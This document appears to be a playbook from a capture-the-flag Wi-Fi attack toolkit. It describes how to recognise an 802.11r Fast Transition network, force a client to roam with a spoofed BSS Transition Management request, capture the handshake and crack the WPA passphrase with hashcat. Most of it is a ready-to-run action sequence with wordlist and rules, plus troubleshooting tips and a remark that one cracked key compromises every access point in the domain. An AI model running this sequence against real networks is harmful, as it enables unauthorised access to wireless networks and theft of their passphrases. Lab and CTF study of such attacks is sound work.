# FT-handshake flag — 802.11r roam, crack with hashcat 22000

Capture an 802.11r Fast Transition reassociation. Convert. Crack.

## Recognition

Beacon carries a Mobility Domain Element (MDE, IE 54, 3 bytes:
2-byte MD ID + 1-byte FT capability). Extended Capabilities IE shows
Fast BSS Transition support bit set. Multiple BSSIDs on the same ESSID
share the MD ID.

## The one-shot sequence

```python
run_sequence([
    {"action": "recon_start", "band": "5", "dwell_ms": 250},
    {"action": "wait", "s": 15},
    {"action": "recon_stop"},

    # 1. Force a BTM roam or wait for natural roam.
    {"action": "btm_forced_roam",
     "target_bssid": "AA:BB:CC:DD:EE:FF",   # current AP
     "candidate_bssid": "AA:BB:CC:DD:EE:00", # destination AP
     "client": "11:22:33:44:55:66"},

    # 2. Capture on the destination AP's channel.
    {"action": "capture_ft_handshake",
     "dest_bssid": "AA:BB:CC:DD:EE:00",
     "client": "11:22:33:44:55:66",
     "timeout_s": 60},

    # 3. Convert — hcxpcapngtool handles FT frames as
    #    WPA*02 with the FT-derived MIC.
    {"action": "convert_to_hashcat",
     "mode": 22000,
     "pcap_path": "/tmp/ft.pcapng",
     "out_path": "/tmp/ft.22000"},

    {"action": "crack_start",
     "hash_path": "/tmp/ft.22000",
     "wordlist_path": "/opt/wordlists/rockyou.txt",
     "rules": ["best64.rule"],
     "mode": 22000},
])
```

## The flag surface

Same as any WPA2/3 PSK crack — the recovered PSK is the flag, or the
data-frame decrypt yields it. FT-derived material cracks with the
*same* PSK the AP uses for regular 4-way, because the PMK-R0 root is
derived from the same passphrase.

## The bonus payoff — R0 shared across a fleet

If two APs on the same Mobility Domain use the same PMK-R0-Key-Holder
identifier, cracking the PSK compromises the whole fleet on that MD.
See `ft-r0-shared-fleet-crack`.

## Failure modes

- **No MDE in beacon.** Not an 802.11r deployment. Regular 4-way
  capture applies (`wpa2-crack-flags`).
- **Client refuses BTM roam.** Not BTM-capable, or the BTM Request
  was malformed. Wait for a natural roam.
- **Capture on wrong channel.** FT reassoc frames land on the
  *destination* AP's channel, not the source's. Set your radio to
  the destination channel before firing BTM.

## Cite

- attacks.json: `ft-handshake-capture`, `ft-r0-shared-fleet-crack`,
  `btm-forced-roam`, `neighbor-report-spoof`.
- IEEE Std 802.11-2020, §12.11 (FT).
